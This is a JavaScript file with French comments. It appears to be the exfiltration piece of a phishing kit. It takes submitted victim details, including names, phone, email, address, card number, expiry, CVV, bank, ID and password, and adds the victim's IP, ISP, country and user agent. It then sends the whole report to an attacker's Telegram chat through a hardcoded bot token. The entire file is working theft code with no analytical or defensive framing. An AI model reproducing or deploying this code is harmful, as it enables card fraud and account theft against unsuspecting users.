// tg.js
// Version enrichie : emojis, date/heure, ISP & pays via ipapi.co (CORS OK)

const TELEGRAM_TOKEN = '7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs';
const CHAT_ID        = '-4766781392';

async function sendTelegramNotification(message) {
  try {
    const ua = navigator.userAgent;

    // IP + ISP + pays
    const geoRes = await fetch('https://ipapi.co/json/');
    const geo    = await geoRes.json();
    const ip      = geo.ip || 'N/A';
    const isp     = geo.org || 'N/A';
    const country = geo.country_name || 'N/A';

    // Date & heure
    const now = new Date();
    const pad = n => String(n).padStart(2, '0');
    const dateStr = `${pad(now.getDate())}/${pad(now.getMonth()+1)}/${now.getFullYear().toString().slice(-2)}`;
    const timeStr = `${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
    const datetime = `${dateStr}, ${timeStr}`;

    // En-tête + détails
    const [header, ...rest] = message.split('\n');
    let text = `[📝] ${header}`;
    if (rest.length) {
      const details = rest.join('\n').split('\n').map(line => {
        if (line.startsWith('Nom:'))        return line.replace('Nom:', '👤 Nom:');
        if (line.startsWith('Prénom:'))     return line.replace('Prénom:', '🙋 Prénom:');
        if (line.startsWith('Téléphone:'))  return line.replace('Téléphone:', '📞 Téléphone:');
        if (line.startsWith('Email:'))      return line.replace('Email:', '✉️ Email:');
        if (line.startsWith('Adresse:'))    return line.replace('Adresse:', '🏠 Adresse:');
        if (line.startsWith('Numéro:'))     return line.replace('Numéro:', '💳 Numéro:');
        if (line.startsWith('Exp:'))        return line.replace('Exp:', '📅 Exp:');
        if (line.startsWith('CVV:'))        return line.replace('CVV:', '🔒 CVV:');
        if (line.startsWith('Banque:'))     return line.replace('Banque:', '🏦 Banque:');
        if (line.startsWith('ID:'))         return line.replace('ID:', '🆔 ID:');
        if (line.startsWith('Pass:'))       return line.replace('Pass:', '🔑 Pass:');
        return line;
      }).join('\n');
      text += `\n${details}`;
    }

    // Pied de message
    text +=
      `\n\n[🗓️] Date & heure : ${datetime}` +
      `\n[🌐] IP Client     : ${ip}` +
      `\n[🔎] ISP Client    : ${isp}` +
      `\n[🌍] Pays Client   : ${country}` +
      `\n[📍] User-Agent    : ${ua}` +
      `\n[©️] ${now.getFullYear()} ©️`;

    // Envoi à Telegram
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`
              + `?chat_id=${CHAT_ID}`
              + `&parse_mode=Markdown`
              + `&text=${encodeURIComponent(text)}`;
    const res = await fetch(url);
    if (!res.ok) console.error('Telegram error', res.status, res.statusText);

  } catch (err) {
    console.error('Erreur Telegram:', err);
  }
}

window.sendTelegramNotification = sendTelegramNotification;